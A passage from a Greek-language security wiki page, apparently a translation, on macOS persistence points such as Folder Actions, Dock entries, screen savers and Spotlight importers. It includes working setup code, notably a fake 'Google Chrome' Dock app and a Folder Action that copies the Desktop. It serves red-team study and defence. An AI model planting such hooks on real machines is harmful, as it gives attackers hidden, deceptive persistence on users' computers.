#### Περιγραφή και εκμετάλλευση

Οι Folder Actions είναι scripts που ενεργοποιούνται αυτόματα από αλλαγές σε έναν φάκελο, όπως η προσθήκη ή η αφαίρεση στοιχείων, ή από άλλες ενέργειες, όπως το άνοιγμα ή η αλλαγή μεγέθους του παραθύρου του φακέλου. Αυτές οι ενέργειες μπορούν να χρησιμοποιηθούν για διάφορες εργασίες και να ενεργοποιηθούν με διαφορετικούς τρόπους, όπως μέσω του UI του Finder ή μέσω εντολών τερματικού.<sup>[[17]](#references)[[18]](#references)</sup>

Για τη ρύθμιση του Folder Actions, υπάρχουν επιλογές όπως:

1. Δημιουργία ροής εργασίας Folder Action με το [Automator](https://support.apple.com/guide/automator/welcome/mac) και εγκατάστασή της ως υπηρεσία.
2. Μη αυτόματη σύνδεση ενός script μέσω της ρύθμισης Folder Actions στο μενού περιβάλλοντος ενός φακέλου.
3. Χρήση του OSAScript για την αποστολή μηνυμάτων Apple Event στο `System Events.app`, ώστε να διαμορφωθεί μέσω προγραμματισμού ένα Folder Action.
   - Αυτή η μέθοδος είναι ιδιαίτερα χρήσιμη για την ενσωμάτωση της ενέργειας στο σύστημα, προσφέροντας ένα επίπεδο persistence.

Το παρακάτω script είναι ένα παράδειγμα του τι μπορεί να εκτελεστεί από ένα Folder Action:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Για να καταστήσετε το παραπάνω script χρησιμοποιήσιμο από το Folder Actions, μεταγλωττίστε το χρησιμοποιώντας:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Αφού μεταγλωττιστεί το script, ρυθμίστε τις Folder Actions εκτελώντας το παρακάτω script. Αυτό το script θα ενεργοποιήσει τις Folder Actions καθολικά και θα προσαρτήσει συγκεκριμένα το script που μεταγλωττίστηκε προηγουμένως στον φάκελο Επιφάνεια εργασίας.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Εκτελέστε το script εγκατάστασης με:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- Αυτός είναι ο τρόπος να υλοποιήσετε αυτήν την persistence μέσω GUI:

Αυτό είναι το script που θα εκτελεστεί:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Μεταγλωττίστε το με: `osacompile -l JavaScript -o folder.scpt source.js`

Μετακινήστε το στο:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Στη συνέχεια, ανοίξτε την εφαρμογή `Folder Actions Setup`, επιλέξτε **τον φάκελο που θέλετε να παρακολουθείτε** και, στην περίπτωσή σας, επιλέξτε το **`folder.scpt`** (στη δική μου περίπτωση το ονόμασα output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Τώρα, αν ανοίξετε αυτόν τον φάκελο με το **Finder**, το script σας θα εκτελεστεί.

Αυτή η διαμόρφωση αποθηκεύτηκε σε μορφή base64 στο **plist** που βρίσκεται στη διαδρομή **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**.

Τώρα, ας προσπαθήσουμε να προετοιμάσουμε αυτό το persistence χωρίς πρόσβαση στο GUI:

1. **Αντιγράψτε το `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** στο `/tmp` για να δημιουργήσετε αντίγραφο ασφαλείας:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Αφαιρέστε** τις Folder Actions που μόλις ρυθμίσατε:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Τώρα που έχουμε ένα κενό περιβάλλον:

3. Αντιγράψτε το αντίγραφο ασφαλείας: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Ανοίξτε το Folder Actions Setup.app για να φορτώσετε αυτήν τη διαμόρφωση: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Αυτό δεν λειτούργησε για μένα, αλλά αυτές είναι οι οδηγίες από το writeup:(

### Συντομεύσεις Dock

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Αλλά πρέπει να έχετε εγκαταστήσει μια κακόβουλη εφαρμογή μέσα στο σύστημα
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- `~/Library/Preferences/com.apple.dock.plist`
  - **Trigger**: Όταν ο χρήστης κάνει κλικ στην εφαρμογή μέσα στο Dock

#### Περιγραφή & Exploitation

Όλες οι εφαρμογές που εμφανίζονται στο Dock καθορίζονται μέσα στο plist: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

Μπορείτε να **προσθέσετε μια εφαρμογή** απλώς με:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

Χρησιμοποιώντας λίγο **social engineering**, θα μπορούσατε να **παριστάνετε, για παράδειγμα, το Google Chrome** μέσα στο dock και να εκτελέσετε στην πραγματικότητα το δικό σας script:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Μέθοδοι εισαγωγής

- **Στόχος εγγραφής:** Ένα bundle εφαρμογής με κώδικα για μέθοδο εισαγωγής, εγκατεστημένο στο `~/Library/Input Methods/` (χρήστης) ή στο `/Library/Input Methods/` (διαχειριστής). Αυτό διαφέρει από τα απλά αρχεία αντιστοίχισης πληκτρολογίου `.inputplugin` της Apple, τα οποία από μόνα τους δεν αποτελούν payload αυθαίρετου κώδικα.
- **Ενεργοποίηση:** Ο χρήστης προσθέτει/ενεργοποιεί την πηγή εισαγωγής στις **Ρυθμίσεις συστήματος → Πληκτρολόγιο → Εισαγωγή κειμένου** και έπειτα την επιλέγει ή τη χρησιμοποιεί. Το ότι ένα bundle απλώς αντιγράφηκε στον κατάλογο δεν αποδεικνύει ότι το macOS θα το εκκινήσει. Ο [τρέχων οδηγός της Apple για τις πηγές εισαγωγής](https://support.apple.com/guide/mac-help/mchl84525d76/mac) περιγράφει την ενεργοποίηση και την εναλλαγή πηγών· η [τεκμηρίωση InputMethodKit της Apple](https://developer.apple.com/documentation/inputmethodkit) καλύπτει τις μεθόδους εισαγωγής με κώδικα.
- **Ταυτότητα εκτέλεσης και περιορισμοί:** Η μέθοδος εκτελείται για τον συνδεδεμένο χρήστη, υπό την επιφύλαξη της καταχώρισης της μεθόδου εισαγωγής, της υπογραφής κώδικα και των τρεχόντων ελέγχων ασφαλείας του macOS. Για υπάρχουσες ενεργοποιημένες μεθόδους με εκτελέσιμο αρχείο εγγράψιμο από τον χρήστη, απαιτείται ξεχωριστός έλεγχος διαδρομής και υπογραφής.

Η [παλαιότερη σημείωση της Apple για μεθόδους εισαγωγής τρίτων](https://developer.apple.com/library/archive/qa/qa1810/_index.html) προειδοποιούσε ήδη ότι η αντιγραφή ορισμένων μεθόδων παλέτας σε αυτούς τους καταλόγους δεν αρκεί καν για να εμφανιστούν στις Πηγές εισαγωγής. Στο Mac έρευνας με macOS 26.5.2, ο κατάλογος χρήστη υπάρχει, αλλά δεν είχε εγκατασταθεί ή ενεργοποιηθεί κανένα bundle, επομένως πρόκειται για τεκμηριωμένη υπό όρους διαδρομή και όχι για τοπικό αποτέλεσμα εκτέλεσης.

### Επιλογείς χρωμάτων

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Χρήσιμο για παράκαμψη sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Πρέπει να συμβεί μια πολύ συγκεκριμένη ενέργεια
  - Θα καταλήξετε σε άλλο sandbox
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- `/Library/ColorPickers`
  - Απαιτούνται δικαιώματα root
  - Ενεργοποίηση: Χρήση του επιλογέα χρωμάτων
- `~/Library/ColorPickers`
  - Ενεργοποίηση: Χρήση του επιλογέα χρωμάτων

#### Περιγραφή & exploit

**Κάντε compile ένα** bundle επιλογέα χρωμάτων με τον κώδικά σας (για παράδειγμα, μπορείτε να χρησιμοποιήσετε [**αυτό εδώ**](https://github.com/viktorstrate/color-picker-plus)) και προσθέστε έναν constructor (όπως στην ενότητα [Screen Saver](macos-auto-start-locations.md#screen-saver)) και αντιγράψτε το bundle στο `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Έπειτα, όταν ενεργοποιηθεί ο επιλογέας χρωμάτων, θα πρέπει να εκτελεστεί και το bundle σας.

Αυτό προϋποθέτει ότι μια συμβατή εφαρμογή ανοίγει το system color panel και επιλέγει τον εγκατεστημένο επιλογέα. Ο [οδηγός της Apple για το color panel](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) περιγράφει τις παλαιότερες τοποθεσίες των bundles. Ένας τοπικός έλεγχος διαδρομής εντόπισε την παλαιότερη υπηρεσία XPC επιλογέα χρωμάτων, αλλά δεν είχε εγκατασταθεί ή φορτωθεί κανένας επιλογέας στο Mac έρευνας· μην συμπεραίνετε ότι υπάρχει παράκαμψη TCC μόνο από τη διαδρομή.

Σημειώστε ότι το binary που φορτώνει τη βιβλιοθήκη σας υπόκειται σε **πολύ αυστηρό sandbox**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: **Όχι, επειδή πρέπει να εκτελέσετε τη δική σας εφαρμογή**
- Παράκαμψη TCC: Εξαρτάται από το sandbox και τα δικαιώματα της ενεργοποιημένης επέκτασης· δεν έχει τεκμηριωθεί κάποια γενική παράκαμψη.

#### Τοποθεσία

- Μια συγκεκριμένη εφαρμογή

#### Περιγραφή & Exploit

Ένα παράδειγμα εφαρμογής με Finder Sync Extension [**θα βρείτε εδώ**](https://github.com/D00MFist/InSync).

Οι εφαρμογές μπορούν να έχουν `Finder Sync Extensions`. Αυτή η επέκταση θα βρίσκεται μέσα σε μια εφαρμογή που θα εκτελεστεί. Επιπλέον, για να μπορεί η επέκταση να εκτελέσει τον κώδικά της, **πρέπει να είναι υπογεγραμμένη** με κάποιο έγκυρο πιστοποιητικό Apple developer, πρέπει να είναι **sandboxed** (αν και μπορούν να προστεθούν χαλαρότερες εξαιρέσεις) και πρέπει να καταχωριστεί με κάτι όπως:<sup>[[21]](#references)[[22]](#references)</sup>

Μια εγκατεστημένη επέκταση πρέπει επίσης να είναι **ενεργοποιημένη** και να καλείται για σχετική τοποθεσία ή στοιχείο του Finder· η δημιουργία ενός αυθαίρετου bundle `.appex` δεν αρκεί. Το [Finder Sync API της Apple](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) εκθέτει την κατάσταση ενεργοποίησης. Οι εντολές `pluginkit` παρακάτω δείχνουν ρητή καταχώριση και ενεργοποίηση, όχι αυτόματη εκκίνηση μόνο με την ύπαρξη ενός αρχείου. Η σχετική τεκμηρίωση εξετάστηκε, χωρίς να εγκατασταθεί ή να ενεργοποιηθεί κάποια νέα επέκταση στο Mac της έρευνας.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Προφύλαξη οθόνης

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Χρήσιμο για παράκαμψη sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Ωστόσο, θα καταλήξετε σε ένα συνηθισμένο sandbox εφαρμογής
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- `/System/Library/Screen Savers`
  - Απαιτείται root
  - **Ενεργοποίηση**: Επιλέξτε την προφύλαξη οθόνης
- `/Library/Screen Savers`
  - Απαιτείται root
  - **Ενεργοποίηση**: Επιλέξτε την προφύλαξη οθόνης
- `~/Library/Screen Savers`
  - **Ενεργοποίηση**: Επιλέξτε την προφύλαξη οθόνης

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Περιγραφή & Exploit

Δημιουργήστε ένα νέο project στο Xcode και επιλέξτε το template για τη δημιουργία μιας νέας **προφύλαξης οθόνης**. Στη συνέχεια, προσθέστε τον κώδικά σας, για παράδειγμα τον παρακάτω κώδικα για τη δημιουργία logs.<sup>[[23]](#references)[[24]](#references)</sup>

Κάντε **build** και αντιγράψτε το bundle `.saver` στο **`~/Library/Screen Savers`**. Στη συνέχεια, ανοίξτε το GUI της προφύλαξης οθόνης και, αν απλώς κάνετε κλικ σε αυτήν, θα πρέπει να δημιουργηθούν πολλά logs:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Σημειώστε ότι, επειδή στα entitlements του binary που φορτώνει αυτόν τον κώδικα (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) μπορείτε να βρείτε το **`com.apple.security.app-sandbox`**, θα βρίσκεστε **μέσα στο κοινό sandbox εφαρμογών**.

Κώδικας Saver:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Πρόσθετα Spotlight

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Ωστόσο, θα καταλήξετε σε sandbox εφαρμογής
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Το sandbox φαίνεται πολύ περιορισμένο

#### Τοποθεσία

- `~/Library/Spotlight/`
  - **Ενεργοποίηση**: Δημιουργείται ένα νέο αρχείο με επέκταση που διαχειρίζεται το πρόσθετο Spotlight.
- `/Library/Spotlight/`
  - **Ενεργοποίηση**: Δημιουργείται ένα νέο αρχείο με επέκταση που διαχειρίζεται το πρόσθετο Spotlight.
  - Απαιτείται root
- `/System/Library/Spotlight/`
  - **Ενεργοποίηση**: Δημιουργείται ένα νέο αρχείο με επέκταση που διαχειρίζεται το πρόσθετο Spotlight.
  - Απαιτείται root
- `Some.app/Contents/Library/Spotlight/`
  - **Ενεργοποίηση**: Δημιουργείται ένα νέο αρχείο με επέκταση που διαχειρίζεται το πρόσθετο Spotlight.
  - Απαιτείται νέα εφαρμογή

#### Περιγραφή & Εκμετάλλευση

Το Spotlight είναι η ενσωματωμένη λειτουργία αναζήτησης του macOS, σχεδιασμένη ώστε να παρέχει στους χρήστες **γρήγορη και ολοκληρωμένη πρόσβαση στα δεδομένα των υπολογιστών τους**.\
Για να διευκολύνει αυτή τη γρήγορη αναζήτηση, το Spotlight διατηρεί μια **ιδιόκτητη βάση δεδομένων** και δημιουργεί ένα ευρετήριο **αναλύοντας τα περισσότερα αρχεία**, επιτρέποντας γρήγορες αναζητήσεις τόσο στα ονόματα αρχείων όσο και στο περιεχόμενό τους.<sup>[[25]](#references)</sup>

Ο υποκείμενος μηχανισμός του Spotlight περιλαμβάνει μια κεντρική διεργασία με όνομα 'mds', που σημαίνει **'διακομιστής μεταδεδομένων'.** Συμπληρωματικά, υπάρχουν πολλαπλά daemons 'mdworker' που εκτελούν διάφορες εργασίες συντήρησης, όπως την ευρετηρίαση διαφορετικών τύπων αρχείων (`ps -ef | grep mdworker`). Αυτές οι εργασίες καθίστανται δυνατές μέσω των πρόσθετων εισαγωγής Spotlight, ή **".mdimporter bundles**", τα οποία επιτρέπουν στο Spotlight να κατανοεί και να ευρετηριάζει περιεχόμενο σε ένα ευρύ φάσμα μορφών αρχείων.

Τα πρόσθετα ή τα bundles **`.mdimporter`** βρίσκονται στις τοποθεσίες που αναφέρθηκαν προηγουμένως. Πρέπει να εντοπιστεί ένα νέο bundle και να αντιστοιχεί σε έναν τύπο αρχείου, ενώ το Spotlight πρέπει πράγματι να ευρετηριάσει ένα αντίστοιχο αρχείο· η απλή αντιγραφή ενός bundle δεν αποδεικνύει ότι έχει φορτωθεί. Η [αναφορά MDImporter της Apple](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) συνδέει τη φόρτωση με ένα επιλέξιμο αρχείο που έχει τροποποιηθεί. Η εκτέλεση του Spotlight importer στο macOS 26 δεν δοκιμάστηκε εδώ.

Μπορείτε να **βρείτε όλα τα `mdimporters`** που έχουν φορτωθεί εκτελώντας:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

Και, για παράδειγμα, το **/Library/Spotlight/iBooksAuthor.mdimporter** χρησιμοποιείται για την ανάλυση τέτοιων τύπων αρχείων (μεταξύ άλλων, με επεκτάσεις `.iba` και `.book`):

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> Αν ελέγξετε το Plist άλλων `mdimporter`, ενδέχεται να μη βρείτε την καταχώριση **`UTTypeConformsTo`**. Αυτό συμβαίνει επειδή πρόκειται για ενσωματωμένο _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) και δεν χρειάζεται να καθορίζει επεκτάσεις.
>
> Επιπλέον, τα προεπιλεγμένα plugins του System έχουν πάντα προτεραιότητα, επομένως ένας attacker μπορεί να αποκτήσει πρόσβαση μόνο σε αρχεία που δεν ευρετηριάζονται ήδη από τα `mdimporters` της Apple.

Για να δημιουργήσετε τον δικό σας importer, μπορείτε να ξεκινήσετε με αυτό το project: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) και, στη συνέχεια, να αλλάξετε το όνομα και το **`CFBundleDocumentTypes`**, καθώς και να προσθέσετε το **`UTImportedTypeDeclarations`**, ώστε να υποστηρίζει την επέκταση που θέλετε, και να τις αντικατοπτρίσετε στο **`schema.xml`**.\
Έπειτα, **αλλάξτε** τον κώδικα της συνάρτησης **`GetMetadataForFile`**, ώστε να εκτελεί το payload όταν δημιουργείται ένα αρχείο με την επεξεργαζόμενη επέκταση.

Τέλος, **κάντε build και αντιγράψτε το νέο `.mdimporter`** σε μία από τις τρεις προηγούμενες τοποθεσίες. Μπορείτε να ελέγξετε αν έχει φορτωθεί **παρακολουθώντας τα logs** ή εκτελώντας το **`mdimport -L`**.

> [!TIP]
> Παρόλο που το sandbox του importer είναι πολύ περιοριστικό, το `mdworker` ευρετηριάζει αρχεία με **προνομιακή πρόσβαση ανάγνωσης**. Επομένως, ένα κακόβουλο `.mdimporter` μπορεί να διαβάσει το *περιεχόμενο* αρχείων σε τοποθεσίες που προστατεύονται από το TCC (Downloads, Pictures, Desktop, …) και να διαρρεύσει τα συλλεγμένα metadata χωρίς προτροπή TCC — η παράκαμψη TCC **"Sploitlight" (CVE-2025-31199)**, η οποία διορθώθηκε στο macOS Sequoia 15.4.<sup>[[55]](#references)</sup>

### ~~Preference Pane~~

> [!CAUTION]
> Δεν φαίνεται να λειτουργεί πλέον.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Απαιτεί συγκεκριμένη ενέργεια από τον χρήστη
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

Δεν φαίνεται να λειτουργεί πλέον.<sup>[[26]](#references)</sup>

### Αρχεία Script Εφαρμογών

Writeup: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Ωστόσο, η στοχευμένη εφαρμογή πρέπει να είναι εγκατεστημένη και να εκτελεστεί/χρησιμοποιηθεί από το θύμα
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Location

Ένα **interpreted script το οποίο εκτελεί πράγματι μια εγκατεστημένη εφαρμογή ή ένα εργαλείο** και το οποίο μπορεί να τροποποιήσει ο attacker. Επιβεβαιώστε τα δικαιώματα του αρχείου και τη διαδρομή κλήσης· η εύρεση ενός αρχείου `.sh` ή `.py` από μόνη της δεν αρκεί. Ο [οδηγός code signing της Apple](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) αναφέρει ότι οι υπογεγραμμένες δέσμες εφαρμογών σφραγίζουν τους πόρους, συμπεριλαμβανομένων των scripts. Η επεξεργασία ενός script μέσα στη δέσμη καταργεί αυτήν τη σφραγίδα και ενδέχεται να εντοπιστεί ή να αποκλειστεί κατά την επικύρωση της δέσμης. Ένα εξωτερικό script, όπως ο launcher του Homebrew, έχει διαφορετική συμπεριφορά ως προς την υπογραφή και την εμπιστοσύνη. Ιστορικά παραδείγματα από το writeup περιλαμβάνουν:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – script που χρησιμοποιούνταν σε παλαιότερες εκδόσεις του Sublime Text· πρέπει να ελέγξετε αν υπάρχει το αρχείο και αν χρησιμοποιείται κατά την εκκίνηση στην εγκατεστημένη έκδοση. Δεν υπήρχε στο Mac δοκιμής.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) ή **`/usr/local/bin/brew`** (Intel) – launcher Bash που εκτελείται όταν καλείται αυτή η διαδρομή του `brew`, εφόσον είναι εγκατεστημένος και μπορεί να τον τροποποιήσει ο attacker. Το `/opt/homebrew/bin/brew` ήταν εγγράψιμο Bash script στο Mac δοκιμής· πρόκειται για τοπική παρατήρηση, όχι για γενικό κανόνα δικαιωμάτων του Homebrew.
- Το `idlemain.py` του IDLE μέσα σε δέσμη εφαρμογής Python – ενδέχεται να απαιτεί δικαιώματα admin για εγγραφή, αλλά εκτελείται με την ταυτότητα του χρήστη του IDLE.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – ιστορικό shell script που εκτελείται ως root όταν είναι εγκατεστημένο το αντίστοιχο launchd job `org.wireshark.ChmodBPF`. Το script και το job δεν υπήρχαν στο Mac δοκιμής.

#### Περιγραφή και εκμετάλλευση

Ορισμένα εργαλεία και εφαρμογές εκτελούν interpreted scripts κατά τον χρόνο εκτέλεσης. Ένα εγγράψιμο script μπορεί να εκτελέσει πρόσθετες εντολές την επόμενη φορά που θα εκτελεστεί από τον συγκεκριμένο caller, εφόσον το επιτρέπουν η επικύρωση υπογραφής, το quarantine και οι άλλοι έλεγχοι. Η αρχική έρευνα παρουσίασε αρκετές εγκαταστάσεις του 2019· ελέγξτε ξανά τις διαδρομές και τις συνθήκες ενεργοποίησής τους στην έκδοση-στόχο.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

